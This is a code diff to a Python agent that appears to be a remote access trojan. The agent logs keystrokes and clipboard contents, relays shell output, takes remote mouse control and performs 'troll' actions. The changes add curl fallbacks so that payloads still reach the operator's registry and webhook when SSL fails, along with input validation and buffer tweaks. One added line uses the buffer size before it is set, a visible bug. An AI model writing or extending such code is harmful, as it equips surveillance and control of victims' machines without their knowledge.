@@ -14,6 +14,7 @@ import argparse
 import getpass
 import time
 from datetime import datetime
+from collections import deque
 
 try:
     import keyring
@@ -222,7 +223,7 @@ class AsyncAgent:
         self.resource_mgr = get_resource_manager() if AIORTC_AVAILABLE else None
 
         # Ghost Mode & Buffer
-        self.output_buffer = []
+        self.output_buffer = deque(maxlen=self.MAX_BUFFER_SIZE)
         self.MAX_BUFFER_SIZE = 5000
         self.reconnect_delay = 1.0  # Start with 1s
         self.target_fps = 30  # Default FPS
@@ -456,12 +457,32 @@ class AsyncAgent:
                         req.add_header(
                             "Content-Type", "application/json; charset=utf-8"
                         )
-                        jsondata = json.dumps(payload).encode("utf-8")
+                        payload_json = json.dumps(payload)
+                        jsondata = payload_json.encode("utf-8")
                         req.add_header("Content-Length", len(jsondata))
                         
-                        # Simple, standard call. Windows handles certificates.
-                        with urllib.request.urlopen(req, jsondata, timeout=10):
-                            pass
+                        try:
+                            # Simple, standard call. Windows handles certificates.
+                            with urllib.request.urlopen(req, jsondata, timeout=10):
+                                pass
+                        except Exception as e:
+                            # If SSL error, fallback to curl (which handles OS certs better in some envs)
+                            error_str = str(e).lower()
+                            if "ssl" in error_str or "certificate" in error_str:
+                                try:
+                                    # Construct curl command for Windows
+                                    # -s: silent, -S: show error, -X: method, -H: header, -d: data
+                                    cmd = [
+                                        "curl", "-s", "-S", "-X", "POST",
+                                        "-H", "Content-Type: application/json",
+                                        "-d", payload_json,
+                                        f"{self.registry_url}/api/update"
+                                    ]
+                                    subprocess.run(cmd, check=True, capture_output=True, timeout=15)
+                                    return # Success via fallback
+                                except Exception as curl_e:
+                                    raise Exception(f"Urllib SSL fail ({e}) AND Curl fallback fail ({curl_e})")
+                            raise e
 
                     await self.loop.run_in_executor(None, do_request)
                     if self.consecutive_heartbeat_fails > 0:
@@ -578,8 +599,7 @@ class AsyncAgent:
                             protocol.OP_KEY_LOG,
                             protocol.OP_CLIP_ENTRY,
                         ]:
-                            if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
-                                self.output_buffer.append((opcode, msg[1:]))
+                            self.output_buffer.append((opcode, msg[1:]))
 
                 # Also send to direct clients if any
                 if self.direct_ws_clients:
@@ -619,8 +639,7 @@ class AsyncAgent:
                 protocol.OP_KEY_LOG,
                 protocol.OP_CLIP_ENTRY,
             ]:
-                if len(self.output_buffer) < self.MAX_BUFFER_SIZE:
-                    self.output_buffer.append((opcode, payload))
+                self.output_buffer.append((opcode, payload))
 
     def on_shell_output(self, text):
         self._send_async(
@@ -754,7 +773,7 @@ class AsyncAgent:
         if self.webrtc_handler:
             try:
                 await self.webrtc_handler.close()
-            except:
+            except Exception:
                 pass
             self.webrtc_handler = None
 
@@ -795,12 +814,10 @@ class AsyncAgent:
             print(f"[-] Troll Blocked: Cooldown ({self.TROLL_COOLDOWN_SEC}s)")
             return False
 
-        # 2. erming!
-
-        # 3. Update Cooldown
+        # 2. Update Cooldown
         self.troll_cooldowns["self"] = now
 
-        # 4. Gating (EarRape unsupported)
+        # 3. Gating (EarRape unsupported)
         if opcode == protocol.OP_TROLL_EARRAPE:
             print("[-] EarRape not supported/allowed.")
             return False
@@ -1053,11 +1070,11 @@ class AsyncAgent:
 
                         settings = msgpack.unpackb(payload)
                         self.apply_settings(settings)
-                    except:
+                    except Exception:
                         try:
                             settings = json.loads(payload.decode("utf-8"))
                             self.apply_settings(settings)
-                        except:
+                        except (json.JSONDecodeError, UnicodeDecodeError):
                             pass
 
                 # ================================================================
@@ -1604,11 +1621,29 @@ class AsyncAgent:
                 self.auditor.stop()
             elif op == "mouse_move":
                 if self.input_ctrl:
-                    self.input_ctrl.move_mouse(data["x"], data["y"])
+                    x = data.get("x")
+                    y = data.get("y")
+                    if isinstance(x, (int, float)) and isinstance(y, (int, float)):
+                        await self.loop.run_in_executor(
+                            None, self.input_ctrl.move_mouse, x, y
+                        )
+                    else:
+                        print(f"[-] Invalid mouse_move data: {data}")
             elif op == "mouse_click":
                 if self.input_ctrl:
-                    self.input_ctrl.move_mouse(data["x"], data["y"])
-                    self.input_ctrl.click_mouse(data["button"], data["pressed"])
+                    x = data.get("x")
+                    y = data.get("y")
+                    button = data.get("button")
+                    pressed = data.get("pressed")
+                    if isinstance(x, (int, float)) and isinstance(y, (int, float)) and isinstance(button, int) and isinstance(pressed, bool):
+                        await self.loop.run_in_executor(
+                            None, self.input_ctrl.move_mouse, x, y
+                        )
+                        await self.loop.run_in_executor(
+                            None, self.input_ctrl.click_mouse, button, pressed
+                        )
+                    else:
+                        print(f"[-] Invalid mouse_click data: {data}")
 
         except Exception as e:
             print(f"Error handling message: {e}")
@@ -1632,10 +1667,31 @@ class AsyncAgent:
             req.add_header("Content-Type", "application/json")
             req.add_header("User-Agent", "Mozilla/5.0")
 
-            jsondata = json.dumps(payload).encode("utf-8")
+            payload_json = json.dumps(payload)
+            jsondata = payload_json.encode("utf-8")
             req.add_header("Content-Length", len(jsondata))
 
-            urllib.request.urlopen(req, jsondata, timeout=5)
+            try:
+                urllib.request.urlopen(req, jsondata, timeout=5)
+            except Exception as e:
+                # SSL Fallback for Webhooks
+                error_str = str(e).lower()
+                if "ssl" in error_str or "certificate" in error_str:
+                    try:
+                        import subprocess
+                        cmd = [
+                            "curl", "-s", "-S", "-X", "POST",
+                            "-H", "Content-Type: application/json",
+                            "-H", "User-Agent: Mozilla/5.0",
+                            "-d", payload_json,
+                            WEBHOOK_URL
+                        ]
+                        subprocess.run(cmd, check=True, capture_output=True, timeout=10)
+                    except Exception as curl_e:
+                        raise Exception(f"Urllib SSL fail ({e}) AND Curl fallback fail ({curl_e})")
+                else:
+                    raise e
+            
             print("[+] Announcement Sent")
         except Exception as e:
             print(f"[-] Announcement Failed: {e}")
@@ -1653,12 +1709,8 @@ class AsyncAgent:
             for i, (opcode, payload) in enumerate(msgs):
                 try:
                     await send_msg(self.ws, bytes([opcode]) + payload)
-                    # Remove from original buffer only after success (thread-safe ish for async list?)
-                    # Alternatively, just clear at end if all success.
-                    # But safest requested: pop item or only clear successful.
-                    # Since we are single-threaded async here:
-                    if self.output_buffer:
-                        self.output_buffer.pop(0)
+                    # Remove from original buffer only after success
+                    self.output_buffer.popleft()
 
                 except Exception as e:
                     print(f"[-] Flush Partial Error: {e}")
@@ -2038,7 +2090,6 @@ def main():
     except Exception:
         # Log fatal crash
         import traceback
-        import datetime
 
         crash_file = "crash_log.txt"
         if getattr(sys, "frozen", False):
@@ -2057,4 +2108,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-# alr
